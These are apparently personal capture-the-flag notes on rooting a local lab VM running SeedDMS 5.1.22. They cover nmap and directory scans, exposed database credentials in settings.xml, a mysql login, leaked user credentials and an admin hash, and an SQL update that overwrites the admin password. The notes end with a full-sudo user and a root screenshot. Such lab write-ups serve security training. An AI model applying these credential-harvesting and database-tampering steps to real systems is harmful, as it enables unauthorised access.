...
- `nmap IP`:
```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-06 15:51 EDT
...
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 08:00:27:37:F1:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
```
- `nmap -p- -A -T4 --script vuln -sS 192.168.48.133 -oN Ascan.txt`:
```sh title:"Ascan.txt" fold
# Nmap 7.95 scan initiated Mon May 12 09:15:23 2025 as: /usr/lib/nmap/nmap -p- -A -T4 --script vuln -sS -oN Ascan.txt 192.168.48.133
...
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.48.133
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.48.133:80/
|     Form id: contact
|_    Form action: 
|_http-dombased-xss: Couldn't find any DOM based XSS.
3306/tcp  open  mysql   MySQL 8.0.25-0ubuntu0.20.04.1
| vulners: 
|   cpe:/a:mysql:mysql:8.0.25-0ubuntu0.20.04.1: 
|     	CVE-2024-21057	4.9	https://vulners.com/cve/CVE-2024-21057
|_    	NODEJS:602	0.0	https://vulners.com/nodejs/NODEJS:602
33060/tcp open  mysqlx  MySQL X protocol listener
MAC Address: 00:0C:29:D9:76:B7 (VMware)
...
TRACEROUTE
HOP RTT     ADDRESS
1   0.41 ms 192.168.48.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 12 09:16:07 2025 -- 1 IP address (1 host up) scanned in 43.49 seconds
```
## http enum:
### dirbusting results:
```http
301      GET        9l       28w      314c http://192.168.48.133/css => http://192.168.48.133/css/
301      GET        9l       28w      313c http://192.168.48.133/js => http://192.168.48.133/js/
301      GET        9l       28w      314c http://192.168.48.133/img => http://192.168.48.133/img/
200      GET       92l      561w    44947c http://192.168.48.133/img/third_item.jpg
200      GET        5l       73w     3235c http://192.168.48.133/img/logo.png
200      GET        5l      522w    19835c http://192.168.48.133/css/bootstrap-theme.min.css
200      GET       51l      357w    32717c http://192.168.48.133/img/second_item.jpg
200      GET      152l     1056w    71119c http://192.168.48.133/img/fifth_big_item.jpg
200      GET        7l      400w    35601c http://192.168.48.133/js/vendor/bootstrap.min.js
200      GET       98l      474w    46368c http://192.168.48.133/img/ninth_item.jpg
301      GET        9l       28w      316c http://192.168.48.133/fonts => http://192.168.48.133/fonts/
200      GET      241l     1646w   147690c http://192.168.48.133/img/about_image.jpg
200      GET       63l      313w    25488c http://192.168.48.133/img/sixth_item.jpg
200      GET      281l     1507w   127136c http://192.168.48.133/img/seventh_big_item.jpg
200      GET     2337l     3940w    39749c http://192.168.48.133/css/fontAwesome.css
200      GET      848l     1585w    14339c http://192.168.48.133/css/templatemo-main.css
200      GET      493l     2963w   286170c http://192.168.48.133/img/ninth_big_item.jpg
200      GET      216l      407w     4118c http://192.168.48.133/css/light-box.css
200      GET        6l       50w     1825c http://192.168.48.133/img/mini_logo.png
200      GET      220l     1133w    94938c http://192.168.48.133/img/fourth_big_item.jpg
200      GET       68l      347w    32231c http://192.168.48.133/img/seventh_item.jpg
301      GET        9l       28w      320c http://192.168.48.133/js/vendor => http://192.168.48.133/js/vendor/
200      GET      345l     2183w   186402c http://192.168.48.133/img/first_big_item.jpg
200      GET       51l      312w    30479c http://192.168.48.133/img/first_item.jpg
200      GET     3513l     9544w   126889c http://192.168.48.133/js/plugins.js
200      GET     2030l     5606w    59581c http://192.168.48.133/js/datepicker.js
200      GET      576l     3225w   278090c http://192.168.48.133/img/third_big_item.jpg
200      GET       88l      277w     2997c http://192.168.48.133/js/main.js
200      GET       69l      326w    26680c http://192.168.48.133/img/fourth_item.jpg
200      GET      274l     1827w   189648c http://192.168.48.133/img/second_big_item.jpg
200      GET       11l      391w    20106c http://192.168.48.133/js/vendor/modernizr-2.8.3-respond-1.4.2.min.js
200      GET      143l      660w    60864c http://192.168.48.133/img/first_service.jpg
200      GET       67l      368w    28384c http://192.168.48.133/img/second_service.jpg
200      GET      111l      522w    42137c http://192.168.48.133/img/eight_item.jpg
200      GET        5l     1421w   113498c http://192.168.48.133/css/bootstrap.min.css
200      GET      299l     1417w   128836c http://192.168.48.133/img/sixth_big_item.jpg
200      GET       71l      221w    17861c http://192.168.48.133/img/fifth_item.jpg
200      GET      484l     2218w   203694c http://192.168.48.133/img/eight_big_item.jpg
200      GET      426l     1168w    23744c http://192.168.48.133/
301      GET        9l       28w      320c http://192.168.48.133/css/fonts => http://192.168.48.133/css/fonts/
200      GET      298l     1958w   150735c http://192.168.48.133/img/aa
```
#### actual http enum:
- nothing on any of the sources. cant access mysql. im stuck kinda. hmm imma try going through all the js files 
- found a path in http://192.168.48.133/js/main.js
```http
/seeddms51x/seeddms-5.1.22/
```
- noway a login page: <br>
![[Hack_me_pleaseSeedDMSDiscoverySS.png]]
- did a quick searchsploit. got these: <br>
![[Hack_me_pleaseSeedDMSSearchsploitResult.png]]
- hmm i need to authenticate smh
- oh and the url says its using `seeddms-5.1.22` 
- found the folder structure at https://www.seeddms.org/posts/folder_structure/. doesnt tell me the exact locations of the config files. lets google it instead 
- hell yeah google to the save as always: <br>
![[Hack_me_pleaseSeedDMSconfFileLocationGoogleSS.png]]
- http://192.168.48.133/seeddms51x/conf/settings.xml: [[hack_me_pleaseSeedDMSSettings]] 
- noway db creds <br>
![[Hack_me_pleaseDBCredsInSettingsFile.png]]
- db creds:
```
seeddms:seeddms
```
- shit i got blocked because of my shenanigans earlier <br>
![[Hack_me_pleaseMysqlBlockedLmao.png]]
- restarted the machine. got in. lets poke around in the DB
```sh
mysql -h 192.168.48.133 -u seeddms -D seeddms -pseeddms --ssl=0
```
- users table gave us creds:
```
saket:Saket@#$1337
```
- doesnt work on the login panel
- got admin creds from the tblUsers table: <br>
![[Hack_me_pleaseAdminCredsHasBeenFound.png]]
- creds:
```
admin:f9ef2c539bad8a6d2f3432b6d49ab51a
```
- hmm these creds dont seem to work on the login page. probably hashed
- yup hashed <br>
![[Hack_me_pleasePasswordIsHashedInMD5SS.png]]
- fuck i cant crack it. with rockyou. crackstation doesnt know either
- oh right i can just update the password myself lmao
- probably needs to be set in MD5
- generated an MD5 hash for the password `skibidi` with [[hashrat]] and updated in in the [[mysql]] db:
```mysql
update tblUsers set pwd='4af1dc28db426816c402b5dfbdf383b9' where id=1;
```
- hell yeah creds updated: <br>
![[Hack_me_pleaseCredsUpdatedSS.png]]
- new creds:
```
admin:skibidi
```
- bruh why cant i sign in - _ - the creds have been updated
- oh i probably used [[hashrat]] wrong lmao. ill learn how to use it later. used [[md5sum]] instead. still generates the same thing.
	- oh i used `<<<` which snuck in a new line and changed the hash smh. lesson learned
...
- cant run either wtf
- oh right we have some extra user creds 
- hell yeah got in as `saket`
- lets see what this bastard can do
- bruh lmao <br>
![[Hack_me_pleaseSaketALLPermSS.png]]
- welp thats done then <br>
![[Hack_me_pleaseHASBEENROOTED.png]]
